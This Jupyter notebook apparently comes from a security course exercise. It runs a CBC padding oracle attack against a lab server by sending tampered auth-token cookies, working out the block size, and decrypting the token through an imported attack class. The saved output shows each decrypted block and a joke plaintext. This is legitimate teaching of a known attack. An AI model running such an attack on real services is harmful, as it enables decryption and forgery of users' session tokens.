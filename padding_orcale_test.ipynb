{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "%reload_ext autoreload\n",
    "%autoreload 2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CBC-Padding-Oracle Attack\n",
      "-------------------------\n",
      "- IV + Ciphertext: 9d462d97f0aed2d7b904694414871fde304a6c28e46344ab2c7348e814cabb81e763b69f9b80c9ad50e11157186b8c16d60e233e76a7d2ff08036efe114cd6e3bae4a5b2dfe62cf3cdac8b5b71680784ebaf86f8c88ca3ed1d60e739f6eadaf4a3d47e10f8ee9a52b2f7a8fd0d3b27c4\n",
      "- Block size: 16\n",
      "- Block count: 7\n",
      "-------------------------\n",
      "Performing attack...\n",
      "-------------------------\n",
      "Block 0 / IV:      \u001b[92m9d462d97f0aed2d7b904694414871fde\u001b[0;0m\n",
      "------------------------------------------------------------\n",
      "Block 1:           \u001b[92md43948a78edbb4a2db341f3d63e27dab\u001b[0;0m                                                                                                                                                                         \n",
      "DEC-Block 1:       \u001b[92mc42958b79ecba4b2cb240f2d73f26dbb\u001b[0m\n",
      "Plaintext-Block 1: \u001b[92m596f75206e6576657220666967757265\u001b[0m\n",
      "------------------------------------------------------------\n",
      "Block 2:           \u001b[92m0035094cd4073cda48437ab124a9c3fe\u001b[0;0m                                                                                                                                                                         \n",
      "DEC-Block 2:       \u001b[92m1025195cc4172cca58536aa134b9d3ee\u001b[0m\n",
      "Plaintext-Block 2: \u001b[92m206f757420746861742022492073686f\u001b[0m\n",
      "------------------------------------------------------------\n",
      "Block 3:           \u001b[92m821fc2afe3f1afd8608472226c5bfd73\u001b[0;0m                                                                                                                                                                         \n",
      "DEC-Block 3:       \u001b[92m920fd2bff3e1bfc8709462327c4bed63\u001b[0m\n",
      "Plaintext-Block 3: \u001b[92m756c6420686176652075736564206175\u001b[0m\n",
      "------------------------------------------------------------\n",
      "Block 4:           \u001b[92mb276564012dea18e6c761ace6432a581\u001b[0;0m                                                                                                                                                                         \n",
      "DEC-Block 4:       \u001b[92ma266465002ceb19e7c660ade7422b591\u001b[0m\n",
      "Plaintext-Block 4: \u001b[92m7468656e7469636174656420656e6372\u001b[0m\n",
      "------------------------------------------------------------\n",
      "Block 5:           \u001b[92md384c1cba0981c81b8dffa3e121d37ba\u001b[0;0m                                                                                                                                                                         \n",
      "DEC-Block 5:       \u001b[92mc394d1dbb0880c91a8cfea2e020d27aa\u001b[0m\n",
      "Plaintext-Block 5: \u001b[92m797074696f6e2062656361757365202e\u001b[0m\n",
      "------------------------------------------------------------\n",
      "Block 6:           \u001b[92md591b4c6f8a69af40479fe20eff3c3ed\u001b[0;0m                                                                                                                                                                         \n",
      "DEC-Block 6:       \u001b[92mc581a4d6e8b68ae41469ee30ffe3d3fd\u001b[0m\n",
      "Plaintext-Block 6: \u001b[92m2e2e222e203a29090909090909090909\u001b[0m\n",
      "------------------------------------------------------------\n",
      "Plaintext: 596f75206e6576657220666967757265206f757420746861742022492073686f756c64206861766520757365642061757468656e7469636174656420656e6372797074696f6e2062656361757365202e2e2e222e203a29090909090909090909\n",
      "Result: \u001b[96mYou never figure out that \"I should have used authenticated encryption because ...\". :)\t\t\t\t\t\t\t\t\t\u001b[0;0m\n"
     ]
    }
   ],
   "source": [
    "from padding_oracle import CBCPaddingOracle\n",
    "import requests\n",
    "from copy import copy\n",
    "\n",
    "# Target addresses\n",
    "token_addr = \"https://cbc-rsa.syssec.dk:8000/\"\n",
    "oracle_addr = \"https://cbc-rsa.syssec.dk:8000/quote\"\n",
    "\n",
    "def oracle(iv: bytes, block: bytes):\n",
    "    # Create token with the iv and block\n",
    "    token = iv + block\n",
    "\n",
    "    # Create request and attach cookie with token\n",
    "    cookie = {\"authtoken\": token.hex()}\n",
    "    r = requests.get(oracle_addr, cookies=cookie)\n",
    "    \n",
    "    # Check response against some known error responses.\n",
    "    if (r.content == b'Padding is incorrect.' or r.content == b'PKCS#7 padding is incorrect.' or  r.content == b'Zero-length input cannot be unpadded'): #r.content == b'No quote for you!' or\n",
    "        return False\n",
    "    else:\n",
    "        return True\n",
    "\n",
    "# Establish baseline ciphertext\n",
    "r = requests.get(token_addr)\n",
    "ciphertext_str = r.cookies[\"authtoken\"]\n",
    "ciphertext_bytes_baseline = bytearray.fromhex(ciphertext_str)\n",
    "\n",
    "# Find block size by changing bytes from the iv end of the ciphertext until we get a padding error. \n",
    "# We know that the ciphertext contains an IV in the front.\n",
    "ciphertext_bytes = copy(ciphertext_bytes_baseline)\n",
    "block_size = 0\n",
    "for i in range(len(ciphertext_bytes)):\n",
    "    ciphertext_bytes[i] ^= 0x25\n",
    "    r = requests.get(oracle_addr, cookies={\"authtoken\": ciphertext_bytes.hex()})\n",
    "    if (r.content != b'No quote for you!'):\n",
    "        break\n",
    "    else:\n",
    "        block_size += 1\n",
    "\n",
    "# Break encryption using the CBC Padding Oracle\n",
    "breaker = CBCPaddingOracle(copy(ciphertext_bytes_baseline), block_size, oracle)\n",
    "result = breaker.attack()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
